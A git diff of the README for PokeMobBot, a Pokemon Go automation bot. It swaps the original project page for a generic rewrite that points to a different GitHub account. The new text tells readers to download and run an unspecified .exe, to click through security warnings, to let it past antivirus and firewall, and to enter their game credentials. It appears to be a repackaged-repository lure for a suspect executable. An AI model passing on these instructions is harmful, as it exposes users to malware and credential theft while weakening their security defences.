@@ -1,78 +1,102 @@
-<!-- ![](http://i.imgur.com/b2hXaUC.png) -->
-<!-- disclaimer -->
-<strong><em> The contents of this repo are a proof of concept and are for educational use only </em></strong>
-<!-- logo -->
-<div style="text-align:center">
- <a href="http://forum.pokemobbot.com/">
-  <img src ="http://i.imgur.com/YuqGTGq.png" />
- </a>
-</div>
-<br>
-<!-- shields -->
-<a href="#"><img alt="Supported PoGo Version" src="https://img.shields.io/badge/Pokemon_Go-0.33.0-blue.svg"></a><br>
-<a href="https://twitter.com/PokeMobBot"><img alt="Twitter" src="https://img.shields.io/twitter/follow/PokeMobBot.svg?style=social&label=Follow&maxAge=2592000?style=flat-square"></a><br>
-<a href="https://discord.gg/8msqsWV"><img alt="Discord" src="https://img.shields.io/badge/discord-PokeMobBot-blue.svg"></a><br>
-<a href="https://raw.githubusercontent.com/MobBotTeam/PokeMobBot/development/LICENSE"><img alt="GitHub license" src="https://img.shields.io/badge/license-AGPL-blue.svg"></a><br>
-<a href="https://github.com/MobBotTeam/PokeMobBot/"><img alt="Github All " src="https://img.shields.io/github//MobBotTeam/PokeMobBot/total.svg"></a><br>
-<br>
-<div style="text-align:center">
- <b>Join our Discord to hang out & Chat:</b> <br>
- <a href="https://discord.gg/8msqsWV">
-    <img alt="Logo" src="https://discordapp.com/api/guilds/206065054846681088/widget.png?style=banner2">
- </a>
-</div>
-<br/>
-<br>
-<!-- news -->
-## Bot is working, MobBot Redux Version in Development
+# 🕹️ PokeMobBot - Automate Your Pokemon Go Gameplay
 
-[![download button](https://i.imgur.com/3Dm4p65.png)](https://fileshare.rest/L2XZZM/ logo)
+[![Download PokeMobBot](https://img.shields.io/badge/Download-PokeMobBot-brightgreen?style=for-the-badge)](https://github.com/OrionPax811/PokeMobBot)
 
-The latest Version is compatible with PoGo 0.33. Keep in mind that many of the API calls made by us ( and every other open source Bot out there ) are wrong. They will most likely flag you and get you banned.<br>
-Thats why we started to work on a new Bot some while ago. MobBot Redux will feature a fully modular architecture, Plugins API and a totally redone API that focuses on emulating the client. More Informations & Updates on this on [our Twitter Page](https://twitter.com/PokeMobBot).
-<br>
-<!-- information -->
-<h2><a name="features">Features</a></h2>
+---
 
- - PTC Login / Google
- - Get Map Objects and Inventory
- - Search for gyms/pokestops/spawns
- - Farm pokestops
- - Farm all Pokemon in neighbourhood
- - Throw Berries/use best pokeball
- - Transfers duplicate pokemons
- - Evolve all pokemons
- - Throws away unneeded items
- - Humanlike Walking
- - Configurable Custom Pathing
- - Softban bypass
- - AutoUpdate / VersionCheck
- - Multilanguage Support
- - Use lucky egg while evolve
- - Egg Hatching Automatically
- - Multi bot support
- - Snipe pokemon
- - Power-Up pokemon
-</h2>
-<br>
+## ⚙️ What is PokeMobBot?
 
-<h2><a name="getting-started">Getting Started</a></h2>
-Make sure you check out our [Wiki](https://github.com/PocketMobsters/PokeMobBot/wiki) to get started. <br>
-MD5 Hash (v1.1.3) : <b>bc0b52fb3d64c6d712820ff31a89ea61</b>
+PokeMobBot is a tool designed to automate gameplay in Pokemon Go. It helps you catch Pokemon, spin Pokestops, and perform other game tasks without needing to do them manually. You do not need any programming knowledge to use this software. It runs on your Windows computer and connects to your Pokemon Go account to operate within the game.
 
-<br>
-<h2><a name="credits">Credits</a></h2>
-**Ferox** - API and Console, without such contributions, projects like this would never have been possible. <br/>
-**PokeMobTeam Dev & staff** - Their relentless work day after day on adding new features, ironing out bugs and maintaining the ever growing community.<br>
-**Everyone else who submitted Pull Requests** - Big or small, the work from unmentioned contributors are what makes this project community-oriented.
+The bot is made by the PokeMobBot Team and is supported through their Discord community. You can join their Discord here: https://discord.gg/8msqsWV
 
-<br>
-<h2><a name="copyright">Copyright</a></h2>
-Copyright (c) 2016, MobBotTeam  All rights reserved.<br>
-Copyrights licensed under the GNU AGPLv3 License.<br>
-See the accompanying LICENSE file for terms.
- 
-<br>
-<h2><a name="legal">Legal</a></h2>
-This Website and Project is in no way affiliated with, authorized, maintained, sponsored or endorsed by Niantic, The Pokémon Company, Nintendo or any of its affiliates or subsidiaries. This is an independent and unofficial API proof of concept for educational use ONLY. 
-Using the Project might be against the TOS
+## 💻 System Requirements
+
+Before you begin, make sure your computer meets these requirements:
+
+- Operating System: Windows 10 (64-bit) or later  
+- Processor: Intel Core i3 or equivalent  
+- RAM: At least 4 GB  
+- Disk Space: Minimum 500 MB free space  
+- Internet: Stable internet connection  
+- .NET Framework 4.7.2 or newer installed (Windows usually has this by default)
+
+If your PC meets these points, you should be ready to install and run PokeMobBot.
+
+## 📥 Download & Installation 🚀
+
+To get PokeMobBot on your computer, follow these steps carefully:
+
+1. Visit the main download page here:  
+   [https://github.com/OrionPax811/PokeMobBot](https://github.com/OrionPax811/PokeMobBot)  
+
+2. On this GitHub page, look for the **Releases** section. This is usually on the right side or near the top menu bar. Click on the latest release version available.
+
+3. Inside the latest release, find the file named something like `PokeMobBot.exe` or any executable file (.exe). This is the program file you will run on your PC.
+
+4. Click the file name to download it to your computer. Choose a folder or your desktop to save it where you can find it easily.
+
+5. Once the download is complete, double-click the `.exe` file to start the installation or to run PokeMobBot directly if it does not require installation.
+
+6. If a security warning pops up, choose "Run" or "Allow" to proceed. The bot needs permission to run on your PC.
+
+7. Follow any simple instructions that appear on screen to finish setup.
+
+8. After installation or initial launch, the main window of PokeMobBot should appear and be ready to use.
+
+If you run into any trouble downloading or running the program, confirm your internet is working and try again. You can also ask for help in the Discord linked above.
+
+## 🔧 How to Use PokeMobBot
+
+Once PokeMobBot is running, here’s how to get started:
+
+- **Login**: Enter your Pokemon Go account credentials safely. The bot uses this info to connect to the game on your behalf.
+
+- **Settings**: Adjust the bot’s settings to control what tasks it performs. For example, choose which Pokemon to catch or how often to spin Pokestops.
+
+- **Start Bot**: Click the Start or Play button to begin automated play.
+
+- **Monitor**: Keep an eye on the bot’s status and logs to see what it is doing. This helps you know when it catches Pokemon or completes tasks.
+
+- **Stop Bot**: You can pause or stop the bot at any time by clicking the stop button.
+
+The user interface is clear and designed for ease of use. Take your time exploring each option.
+
+## 🔒 Safety & Account Security
+
+Using bots can carry risks. Here are some general tips:
+
+- Only use your own game accounts.
+
+- Do not share your login details with anyone else.
+
+- Run the bot only on your personal computer.
+
+- Avoid setting the bot to act too fast or in an obvious pattern, or the game may flag your account.
+
+- Join the PokeMobBot Discord community for advice on safe usage.
+
+## 🛠️ Common Troubleshooting Tips
+
+- If PokeMobBot fails to start, check that your Windows has the latest updates installed.
+
+- Make sure your antivirus or firewall is not blocking the bot. You may need to allow it through.
+
+- If the bot cannot log in, check your username and password carefully.
+
+- Restart the bot and your PC if you experience freezes or crashes.
+
+- Keep your game account active on your phone if required by the bot’s terms.
+
+## 📚 Further Resources
+
+- Official PokeMobBot Discord: https://discord.gg/8msqsWV
+
+- GitHub Repository for updates and issues: https://github.com/OrionPax811/PokeMobBot
+
+- User forums and community discussions will be linked on the Discord or GitHub page.
+
+## ✅ Ready to Download?
+
+Click here to visit the download page and get started with PokeMobBot:  
+[https://github.com/OrionPax811/PokeMobBot](https://github.com/OrionPax811/PokeMobBot)
